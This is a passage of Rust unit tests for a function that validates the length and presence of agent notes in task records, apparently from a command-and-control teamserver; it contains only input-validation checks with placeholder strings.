            AgentCommandError::NoteTooLong { length, limit } => {
                assert_eq!(length, MAX_AGENT_NOTE_LEN + 1);
                assert_eq!(limit, MAX_AGENT_NOTE_LEN);
            }
            other => panic!("expected NoteTooLong, got {other:?}"),
        }
    }

    #[test]
    fn note_from_task_rejects_oversized_note_from_task_message() {
        let note = "y".repeat(MAX_AGENT_NOTE_LEN + 1024);
        let info = AgentTaskInfo {
            command_id: "Teamserver".to_owned(),
            command: Some("agent::note".to_owned()),
            task_message: Some(note),
            ..AgentTaskInfo::default()
        };

        let err = note_from_task(&info).expect_err("oversized note_message should be rejected");
        assert!(matches!(err, AgentCommandError::NoteTooLong { .. }));
    }

    #[test]
    fn note_from_task_rejects_missing_note() {
        let info = AgentTaskInfo {
            command_id: "Teamserver".to_owned(),
            command: Some("agent::note".to_owned()),
            ..AgentTaskInfo::default()
        };

        let err = note_from_task(&info).expect_err("empty note should be rejected");
        assert!(matches!(err, AgentCommandError::MissingNote));
    }

    #[test]
    fn note_from_task_returns_none_for_non_note_commands() {
        let info = AgentTaskInfo {
            command_id: "42".to_owned(),
            command: Some("ls".to_owned()),
            arguments: Some("x".repeat(MAX_AGENT_NOTE_LEN + 1024)),
            ..AgentTaskInfo::default()
        };

        let extracted =
            note_from_task(&info).expect("non-note commands should not trigger validation");
        assert_eq!(extracted, None);
    }
}
